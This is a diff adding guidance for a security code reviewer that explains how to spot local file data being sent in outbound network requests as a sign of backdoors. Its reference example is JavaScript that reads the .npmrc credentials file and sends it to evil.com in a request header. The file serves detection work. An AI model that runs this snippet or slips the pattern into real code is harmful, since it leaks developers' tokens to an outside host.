@@ -1,0 +1,27 @@
+Review focus: File data in outbound network request
+
+What to look for:
+- Directly sending file data in an outbound network request can indicate unauthorized information disclosure.
+- Sending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.
+- Keep the check only when the changed code appears to introduce, remove, bypass, or misuse the risky behavior itself.
+- Prefer explicit code evidence such as API calls, removed guards, changed data flow steps, changed arguments, or changed signatures over broad similarity.
+
+Relevance threshold:
+- Drop this check if the diff only changes naming, comments, formatting, or unrelated plumbing.
+- Do not keep this check solely because the file belongs to a broad category like security, configuration, or API usage.
+- This is path-sensitive. Keep it only when the diff suggests a plausible source-to-sink or input-to-operation path worth deeper inspection.
+
+Reference examples:
+- Reference example (`FileAccessToHttp.js`):
+```
+var fs = require("fs"),
+    https = require("https");
+
+var content = fs.readFileSync(".npmrc", "utf8");
+https.get({
+  hostname: "evil.com",
+  path: "/upload",
+  method: "GET",
+  headers: { Referer: content }
+}, () => { });
+```
